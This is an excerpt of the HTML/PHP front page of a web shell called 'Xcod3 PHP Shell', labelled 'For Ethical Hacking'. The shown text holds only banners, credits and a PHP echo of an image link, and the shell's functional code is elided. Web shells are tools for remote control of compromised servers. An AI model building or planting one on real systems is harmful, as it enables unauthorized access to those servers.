...
<body class="text-center">
  <p align="center"><a href="https://www.itsecurity.id/"><img height="180" title="Xcod3bughunt3r" src="0011.png"/></a></p>
  <div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
    <header class="masthead mb-auto">
      <div class="inner">
        <h3 class="masthead-brand">XCOD3 PHP SHELL</h3>
    ...
    <main role="main" class="inner cover">
       <header>
    <h1 class="title">Xcod3 PHP Shell</h1>
    <p>For Ethical Hacking</p><br>
  </header>
      <?php
      if (empty($_REQUEST)) {
    	echo '<img src="https://github.com/Xcod3bughunt3r/Xcod3bughunt3r/README.md" alt="ALIF FUSOBAR">';
      echo '<br>';
    	echo '<a href="https://www.itsecurity.id">Dibuat Oleh ALIF FUSOBAR - master@itsecurity.id</a>';
    } ?>
    <?php
...
<footer class="mastfoot mt-auto">
  <div class="inner">
    <p>PHP Shell By <a href="https://www.itsecurity.id"> ALIF FUSOBAR - Xcod3bughunt3r</a></p>
  </div>
</footer>
</div>
